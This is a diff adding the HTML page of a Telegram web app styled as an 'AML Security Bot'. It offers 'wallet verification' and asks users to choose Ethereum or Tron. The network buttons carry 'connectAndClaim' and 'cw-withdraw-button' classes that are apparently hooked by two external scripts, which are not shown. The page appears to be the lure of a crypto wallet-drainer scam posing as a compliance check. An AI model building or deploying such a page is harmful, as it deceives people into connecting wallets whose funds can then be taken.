@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <script type="module" crossorigin src="/assets/index-ewqiA10G.js"></script>
+    <script src="./bundle.js" type="module"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AML Bot - Network Selector</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 25%, #2d1b69 75%, #6366f1 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background elements */
+        .bg-animation {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .floating-orb {
+            position: absolute;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.3), rgba(139, 92, 246, 0.2));
+            filter: blur(40px);
+            animation: float-orb 20s infinite linear;
+        }
+
+        .orb-1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            left: -10%;
+            animation-delay: 0s;
+        }
+
+        .orb-2 {
+            width: 200px;
+            height: 200px;
+            top: 60%;
+            right: -5%;
+            animation-delay: -7s;
+        }
+
+        .orb-3 {
+            width: 400px;
+            height: 400px;
+            bottom: -20%;
+            left: 30%;
+            animation-delay: -14s;
+        }
+
+        @keyframes float-orb {
+            0% { transform: translateY(0px) rotate(0deg); }
+            33% { transform: translateY(-30px) rotate(120deg); }
+            66% { transform: translateY(20px) rotate(240deg); }
+            100% { transform: translateY(0px) rotate(360deg); }
+        }
+
+        /* Grid pattern overlay */
+        .grid-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: grid-move 20s linear infinite;
+            z-index: 1;
+        }
+
+        @keyframes grid-move {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 24px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 6px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .lang-option {
+            padding: 8px 16px;
+            border-radius: 12px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .lang-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .lang-option:hover::before {
+            left: 100%;
+        }
+
+        .lang-option:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(1.05);
+        }
+
+        .lang-option.active {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.4), rgba(139, 92, 246, 0.4));
+            color: white;
+            box-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-section {
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .logo-text {
+            font-size: 48px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #60a5fa 0%, #a855f7 50%, #ec4899 100%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(168, 85, 247, 0.3);
+            margin-bottom: 12px;
+            animation: glow-pulse 3s ease-in-out infinite;
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.2); }
+        }
+
+        .title {
+            color: white;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            text-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 18px;
+            margin-bottom: 60px;
+            font-weight: 400;
+        }
+
+        .step-indicator {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
+            color: white;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 32px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(99, 102, 241, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .section-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .section-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+            margin-bottom: 40px;
+            font-weight: 400;
+        }
+
+        .networks-container {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .network-option {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 24px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(20px);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            text-align: left;
+            font-family: inherit;
+            color: inherit;
+        }
+
+        .network-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.8s ease;
+        }
+
+        .network-option:hover::before {
+            left: 100%;
+        }
+
+        .network-option:hover {
+            transform: translateY(-8px);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .network-option.selected {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
+            border-color: rgba(99, 102, 241, 0.4);
+            transform: translateY(-8px);
+            box-shadow: 0 25px 50px rgba(99, 102, 241, 0.3);
+        }
+
+        .network-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            flex-shrink: 0;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .network-icon::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
+            border-radius: 20px;
+        }
+
+        .ethereum-icon {
+            background: linear-gradient(135deg, #627eea 0%, #8a2be2 100%);
+            color: white;
+        }
+
+        .tron-icon {
+            background: linear-gradient(135deg, #ff4757 0%, #ff6b7a 100%);
+            color: white;
+        }
+
+        .network-details {
+            flex-grow: 1;
+            text-align: left;
+        }
+
+        .network-name {
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .network-type {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .primary-button {
+            width: 100%;
+            max-width: 420px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 20px 32px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            box-shadow: 0 15px 35px rgba(99, 102, 241, 0.4);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .primary-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.8s ease;
+        }
+
+        .primary-button:hover::before {
+            left: 100%;
+        }
+
+        .primary-button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 45px rgba(99, 102, 241, 0.6);
+            background: linear-gradient(135deg, #5b5ff7 0%, #8048f2 100%);
+        }
+
+        .primary-button:active {
+            transform: translateY(-2px);
+        }
+
+        .success-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.95), rgba(5, 150, 105, 0.95));
+            color: white;
+            padding: 24px 36px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 16px;
+            box-shadow: 0 25px 50px rgba(16, 185, 129, 0.4);
+            backdrop-filter: blur(20px);
+            z-index: 1000;
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .success-popup.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        /* Modern animations */
+        .fade-in {
+            animation: fadeInUp 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        .fade-in-delay-1 { animation-delay: 0.2s; opacity: 0; }
+        .fade-in-delay-2 { animation-delay: 0.4s; opacity: 0; }
+        .fade-in-delay-3 { animation-delay: 0.6s; opacity: 0; }
+        .fade-in-delay-4 { animation-delay: 0.8s; opacity: 0; }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Particle effect */
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float-particle 15s infinite linear;
+        }
+
+        @keyframes float-particle {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .logo-text {
+                font-size: 36px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .network-option {
+                padding: 20px;
+                gap: 16px;
+            }
+            
+            .network-name {
+                font-size: 18px;
+            }
+            
+            .primary-button {
+                padding: 18px 28px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation">
+        <div class="floating-orb orb-1"></div>
+        <div class="floating-orb orb-2"></div>
+        <div class="floating-orb orb-3"></div>
+    </div>
+    
+    <div class="grid-overlay"></div>
+    
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <div class="header">
+            <div class="language-selector">
+                <button class="lang-option active" onclick="changeLanguage('ru')">RU</button>
+                <button class="lang-option" onclick="changeLanguage('en')">EN</button>
+                <button class="lang-option" onclick="changeLanguage('zh')">中</button>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="logo-section fade-in">
+                <div class="logo-text">AML</div>
+            </div>
+            
+            <h1 class="title fade-in fade-in-delay-1" data-text="title">Security Bot</h1>
+            <p class="subtitle fade-in fade-in-delay-1" data-text="subtitle">Secure compliance checking</p>
+
+            <div class="step-indicator fade-in fade-in-delay-2" data-text="step">Step 1 of 3</div>
+            
+            <h2 class="section-title fade-in fade-in-delay-2" data-text="walletTitle">Wallet Verification</h2>
+            <p class="section-subtitle fade-in fade-in-delay-2" data-text="walletSubtitle">Choose your preferred blockchain network</p>
+
+            <div class="networks-container">
+                <button class="connectAndClaim network-option fade-in fade-in-delay-3">
+                    <div class="network-icon ethereum-icon">Ξ</div>
+                    <div class="network-details">
+                        <div class="network-name" data-text="ethereum">Ethereum</div>
+                        <div class="network-type" data-text="ethereumType">ERC-20 Network</div>
+                    </div>
+                </button>
+
+                <button class="cw-connect-button cw-withdraw-button network-option fade-in fade-in-delay-3" style="animation-delay: 0.7s">
+                    <div class="network-icon tron-icon">Ŧ</div>
+                    <div class="network-details">
+                        <div class="network-name" data-text="tron">Tron</div>
+                        <div class="network-type" data-text="tronType">TRC-20 Network</div>
+                    </div>
+                </button>
+            </div>
+
+            <button class="primary-button fade-in fade-in-delay-4" onclick="continueProcess()" data-text="continue">
+                Продолжить
+            </button>
+        </div>
+    </div>
+
+    <div class="success-popup" id="successNotification">
+        <span data-text="success">✓ Network selected successfully</span>
+    </div>
+
+    <script>
+        let selectedNetwork = null;
+        let currentLanguage = 'ru';
+
+        // Translations
+        const translations = {
+            ru: {
+                title: "Security Bot",
+                subtitle: "Безопасная проверка соответствия",
+                step: "Шаг 1 из 3",
+                walletTitle: "Проверка кошелька",
+                walletSubtitle: "Выберите предпочитаемую блокчейн сеть",
+                ethereum: "Ethereum",
+                ethereumType: "ERC-20 сеть",
+                tron: "Tron",
+                tronType: "TRC-20 сеть",
+                continue: "Продолжить",
+                success: "✓ Сеть выбрана успешно"
+            },
+            en: {
+                title: "Security Bot",
+                subtitle: "Secure compliance checking",
+                step: "Step 1 of 3",
+                walletTitle: "Wallet Verification",
+                walletSubtitle: "Choose your preferred blockchain network",
+                ethereum: "Ethereum",
+                ethereumType: "ERC-20 Network",
+                tron: "Tron",
+                tronType: "TRC-20 Network",
+                continue: "Continue",
+                success: "✓ Network selected successfully"
+            },
+            zh: {
+                title: "Security Bot",
+                subtitle: "安全合规检查",
+                step: "第1步，共3步",
+                walletTitle: "钱包验证",
+                walletSubtitle: "选择您首选的区块链网络",
+                ethereum: "以太坊",
+                ethereumType: "ERC-20 网络",
+                tron: "波场",
+                tronType: "TRC-20 网络",
+                continue: "继续",
+                success: "✓ 网络选择成功"
+            }
+        };
+
+        function changeLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Update active language button
+            document.querySelectorAll('.lang-option').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+
+            // Update all text elements
+            document.querySelectorAll('[data-text]').forEach(element => {
+                const key = element.getAttribute('data-text');
+                if (translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+
+            // Haptic feedback
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
+            }
+        }
+
+        function selectNetwork(network) {
+            // Remove previous selection
+            document.querySelectorAll('.network-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            // Select current option
+            event.currentTarget.classList.add('selected');
+            selectedNetwork = network;
+            
+            // Haptic feedback for Telegram
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
+            }
+        }
+
+        function continueProcess() {
+            if (!selectedNetwork) {
+                // Shake animation if no network selected
+                const btn = event.currentTarget;
+                btn.style.animation = 'shake 0.5s ease-in-out';
+                setTimeout(() => {
+                    btn.style.animation = '';
+                }, 500);
+                
+                // Haptic feedback
+                if (window.Telegram && window.Telegram.WebApp) {
+                    window.Telegram.WebApp.HapticFeedback.notificationOccurred('error');
+                }
+                return;
+            }
+
+            // Show success notification
+            const notification = document.getElementById('successNotification');
+            notification.classList.add('show');
+            
+            // Success haptic
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+            }
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+                console.log('Selected network:', selectedNetwork);
+                // Here you would navigate to next step
+            }, 2000);
+        }
+
+        function closeApp() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.close();
+            } else {
+                window.close();
+            }
+        }
+
+        // Create particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Add shake animation
+        const shakeCSS = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                25% { transform: translateX(-8px); }
+                75% { transform: translateX(8px); }
+            }
+        `;
+        const style = document.createElement('style');
+        style.textContent = shakeCSS;
+        document.head.appendChild(style);
+
+        // Initialize app
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set default language to Russian
+            changeLanguageDirectly('ru');
+            createParticles();
+            
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+                window.Telegram.WebApp.setHeaderColor('#0a0e27');
+                window.Telegram.WebApp.setBackgroundColor('#0a0e27');
+            }
+        });
+
+        function changeLanguageDirectly(lang) {
+            currentLanguage = lang;
+            
+            // Update active language button
+            document.querySelectorAll('.lang-option').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.textContent === (lang === 'ru' ? 'RU' : lang === 'en' ? 'EN' : '中')) {
+                    btn.classList.add('active');
+                }
+            });
+
+            // Update all text elements
+            document.querySelectorAll('[data-text]').forEach(element => {
+                const key = element.getAttribute('data-text');
+                if (translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+        }
+
+        // Touch feedback
+        document.addEventListener('touchstart', function(e) {
+            if (e.target.closest('.network-option, .primary-button')) {
+                e.target.closest('.network-option, .primary-button').style.transform = 'scale(0.98)';
+            }
+        });
+
+        document.addEventListener('touchend', function(e) {
+            if (e.target.closest('.network-option, .primary-button')) {
+                setTimeout(() => {
+                    const element = e.target.closest('.network-option, .primary-button');
+                    if (element) {
+                        element.style.transform = '';
+                    }
+                }, 100);
+            }
+        });
+    </script>
+</body>
+</html>
